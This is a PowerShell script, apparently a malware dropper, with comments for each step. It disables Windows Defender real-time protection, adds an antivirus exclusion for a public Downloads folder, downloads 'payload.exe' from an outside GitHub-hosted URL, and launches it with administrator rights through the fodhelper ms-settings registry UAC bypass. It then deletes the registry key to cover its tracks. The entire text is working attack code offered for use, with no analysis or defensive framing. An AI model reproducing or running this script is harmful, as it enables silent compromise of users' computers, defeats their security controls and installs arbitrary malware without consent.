# --- Step 0: Disable Windows Defender Real-time Monitoring ---
# This is the first and most important step. We try to disable the main
# real-time protection to prevent it from interfering.
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} catch {
    # If this fails, we can write an error to a log file for debugging.
    "Failed to disable Defender RTM" | Out-File "C:\Users\Public\Downloads\error.log" -Append
}

# --- Step 1: Add an Exclusion for our Payload Directory ---
# This is a second layer of defense. Even if real-time monitoring comes back on,
# it will ignore the folder where our payload lives.
try {
    Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
} catch {
    "Failed to add exclusion path" | Out-File "C:\Users\Public\Downloads\error.log" -Append
}


# --- Step 2: Download the main payload ---
# Now that defenses are lowered, we download the actual .exe file.
$payloadURL = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
$savePath = "C:\Users\Public\Downloads\payload.exe"
Invoke-WebRequest -Uri $payloadURL -OutFile $savePath


# --- Step 3: Perform the UAC Bypass ---
# This is the magic part. It tricks Windows into giving us administrator rights
# without showing the user a pop-up asking for permission.
# It does this by hijacking a special system shortcut.
$RegKey = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
Set-ItemProperty -Path $RegKey -Name "(Default)" -Value $savePath
Set-ItemProperty -Path $RegKey -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"


# --- Step 4: Clean Up the Evidence ---
# We wait a few seconds for fodhelper.exe to do its job, then we delete the
# registry key we created. This helps hide what we just did.
Start-Sleep -Seconds 3
Remove-Item -Path $RegKey -Recurse -Force